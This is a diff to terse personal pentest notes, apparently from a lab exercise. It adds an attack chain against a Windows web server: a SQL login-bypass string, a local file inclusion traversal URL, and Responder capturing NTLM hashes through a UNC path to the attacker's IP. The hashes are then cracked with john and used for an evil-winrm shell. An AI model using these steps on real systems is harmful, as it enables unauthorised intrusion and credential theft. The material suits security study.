@@ -5,3 +5,36 @@ for now only one noob login injection is part of this
 Loginform : username'# will try out login with a password we choose
 
 so easy
+
+
+fli
+
+http://website/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+LFI is possible as we can view the contents of the C:\windows\system32\drivers\etc\hosts file in
+the response.
+
+responder:
+
+Responder is for get response from php websites wich got a LFI possibility
+
+starting responder
+                                                        -- sudo python3 Responder.py -I tun0
+
+going into browser to getting a response in responder
+
+http://website/?page=//ownip/somefile
+
+maybe we getting an answer with admin user hashes
+
+then we can crack the password with uses john and wordlists
+
+connecting with WIN-RM
+
+evil winrm is a connection shell like sh 
+
+-- evil-winrm -i ip -u user -p password
+
+now youre in a shell and can use it
+
+
